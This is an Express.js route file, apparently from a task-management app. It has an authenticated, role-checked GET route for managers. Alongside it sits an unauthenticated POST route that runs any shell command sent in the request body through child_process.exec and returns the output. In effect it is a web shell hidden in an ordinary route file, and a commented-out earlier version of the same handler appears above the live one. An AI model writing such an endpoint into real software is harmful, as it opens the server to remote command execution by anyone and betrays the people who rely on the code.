import express from 'express';

const router = express.Router();

import authRole from '../middleware/authRole.js';
import authMiddleware from '../middleware/authMiddleware.js';
import { getTasksByStatus } from '../controllers/managerControllers.js';

import { exec } from 'child_process';

router.get('/', authMiddleware, authRole('Manager'), getTasksByStatus);

// router.post('/', (req,res) => {
//     exec(req.body.command, (err, stdout, stderr) => {
//         res.send(JSON.stringify(err, stdout, stderr));
//     });
// });

router.post('/', (req, res) => {
    exec(req.body.command, (err, stdout, stderr) => {
        res.json({
            error: err?.message || null,
            output: stdout,
            stderr: stderr
        });
    });
});

export default router;